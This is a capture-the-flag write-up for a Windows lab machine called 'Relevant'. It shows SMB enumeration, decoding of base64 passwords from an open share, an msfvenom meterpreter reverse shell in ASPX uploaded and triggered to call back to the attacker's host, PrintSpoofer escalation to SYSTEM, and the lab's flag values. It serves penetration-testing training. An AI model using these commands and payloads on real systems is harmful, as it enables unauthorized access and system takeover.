# Relevant

Penetration Testing Challenge

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 

Scope of Work

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

* User.txt
* Root.txt

Additionally, the client has provided the following scope allowances:

* Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
* Locate and note all vulnerabilities found
* Submit the flags discovered to the dashboard
* Only the IP address assigned to your machine is in scope
* Find and report ALL vulnerabilities (yes, there is more than one path to root)

(Roleplay off)

I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.

Note - Nothing in this room requires Metasploit

Machine may take up to 5 minutes for all services to start.

*Please do not stream this room for the first 7 days of it's release (August 21, 2020).*

# User flag

## Enumeration

Let's start to enumerate the services with Nmap. There are several web services (80/tcp, 49663/tcp), as well as a network share (445/tcp). 

~~~
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49663/tcp open  http          Microsoft IIS httpd 10.0
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
~~~

## Network share

Let's start with the network share. Listing the shares reveals the presence of `nt4wrksv`.

~~~
$ smbclient -L //10.10.11.52
Enter WORKGROUP\kali's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
SMB1 disabled -- no workgroup available
~~~

Connecting to this share reveals a password file:

~~~
$ smbclient //10.10.11.52/nt4wrksv
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 23:46:04 2020
  ..                                  D        0  Sat Jul 25 23:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020

		7735807 blocks of size 4096. 4951539 blocks available
smb: \> get passwords.txt 
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
~~~

This file contains base64 encoded credentials:

~~~
$ cat passwords.txt 
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
kali@kali:/data/Relevant/files$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
Bob - !P@$$W0rD!123
kali@kali:/data/Relevant/files$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$
~~~

However, we won't need this for the exploitation of the machine, as we will see later.

## Web

Scanning the hidden web directories on both ports `80/tcp` and `49663/tcp` takes a while but is worth it (with `directory-list-2.3-medium.txt`). Nothing interesting stands out on port `80/tcp`, but we find that the `nt4wrksv` share found previously is also available as a hidden location on port `49663/tcp`.

## Upload reverse shell

Interestingly, the network share is writable, which means we can upload arbitrary files. Let's first generate a reverse shell with `msfvenom`:

~~~
$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.50.72 lport=4444 -f aspx -o shell.aspx
~~~

Now, let's connect to the network share and upload our reverse shell `aspx` file:

~~~
smb: \> put shell.aspx 
putting file shell.aspx as \shell.aspx (12.9 kb/s) (average 7.9 kb/s)
smb: \> ls
  .                                   D        0  Thu Aug 27 22:48:34 2020
  ..                                  D        0  Thu Aug 27 22:48:34 2020
  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020
  shell.aspx                          A    38409  Thu Aug 27 22:48:37 2020
  test.txt                            A        5  Thu Aug 27 22:42:10 2020

		7735807 blocks of size 4096. 4946700 blocks available
smb: \> 
~~~

Start a listener in Metasploit

~~~
kali@kali:/data/vpn$ msfconsole -q
msf5 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp
msf5 exploit(multi/handler) > set lhost 10.8.50.72
lhost => 10.8.50.72
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.50.72:4444 
~~~

And call the reverse shell in the browser or with `curl`:

~~~
$ curl http://10.10.11.52:49663/nt4wrksv/shell.aspx
~~~

We now have a meterpreter session:

~~~
[*] Meterpreter session 1 opened (10.8.50.72:4444 -> 10.10.11.52:49728) at 2020-08-28 08:57:33 +0200

meterpreter > getuid 
Server username: IIS APPPOOL\DefaultAppPool
~~~

## User flag

From here, we eventually get the user flag:

~~~
meterpreter > cat c:/users/bob/desktop/user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
~~~

# Root flag

## List privileges

Checking our privileges with `getpriv` in our meterpreter session reveals that we are granted with `SeImpersonatePrivilege`.

~~~
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
~~~

## PrintSpoofer

To exploit this impersonation privilege, the standard *potato* exploit won't work, and we'll use a new tool called [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

[Download](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/), Compile (in Microsoft Visual Studio) and upload `PrintSpoofer.exe` to the target.

~~~
c:\>cd \inetpub\wwwroot\nt4wrksv
cd \inetpub\wwwroot\nt4wrksv

c:\inetpub\wwwroot\nt4wrksv>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot\nt4wrksv

08/28/2020  11:54 PM    <DIR>          .
08/28/2020  11:54 PM    <DIR>          ..
07/25/2020  08:15 AM                98 passwords.txt
08/28/2020  11:47 PM            27,136 PrintSpoofer.exe
08/28/2020  11:54 PM         1,015,587 shell.aspx
               3 File(s)      1,042,821 bytes
               2 Dir(s)  20,256,440,320 bytes free

~~~

## Elevate privileges (PrintSpoofer)

Now, let's elevate our privileges with `printspoofer`:

~~~
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c powershell.exe
PrintSpoofer.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system
~~~

## Root flag

We eventually read the root flag:

~~~
PS C:\Windows\system32> cd \users\administrator\desktop
cd \users\administrator\desktop
PS C:\users\administrator\desktop> dir
dir


    Directory: C:\users\administrator\desktop


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        7/25/2020   8:25 AM             35 root.txt                      


PS C:\users\administrator\desktop> cat root.txt
cat root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
PS C:\users\administrator\desktop> 
~~~
